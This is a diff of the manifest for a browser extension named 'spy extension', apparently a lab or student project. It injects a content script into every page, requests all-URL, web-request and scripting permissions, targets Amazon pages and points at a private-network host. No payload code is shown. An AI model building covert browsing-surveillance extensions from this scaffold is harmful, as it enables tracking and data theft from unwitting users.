@@ -1,22 +1,29 @@
 {
-    "manifest_version": 3,
-    "name": "spy extension",
-    "version": "1",
-    "icons":{
-        "720": "images/icon.png"
-    },
-    "description": "A spy extension that's definitely not a virus.",
-    "background":{
-        "service_worker": "background.js"
-    },
-    "host_permissions": [
-        "http://192.168.209.149/",
-        "<all_urls>"
-    ],
-    "content_scripts": [
-        {
-            "matches": ["*://*/*"],
-            "js":["content.js"]
-        }
-    ]
+  "manifest_version": 3,
+  "name": "spy extension",
+  "version": "1",
+  "icons": {
+    "720": "images/icon.png"
+  },
+  "description": "A spy extension that's definitely not a virus.",
+  "background": {
+    "service_worker": "background.js"
+  },
+  "host_permissions": [
+    "http://192.168.1.220/",
+    "<all_urls>"
+  ],
+  "permissions": [
+    "webRequest",
+    "scripting",
+    "webNavigation",
+    "https://www.amazon.com/*",
+    "https://www.amazon.co.uk/*"
+  ],
+  "content_scripts": [
+    {
+      "matches": ["*://*/*"],
+      "js": ["content.js"]
+    }
+  ]
 }
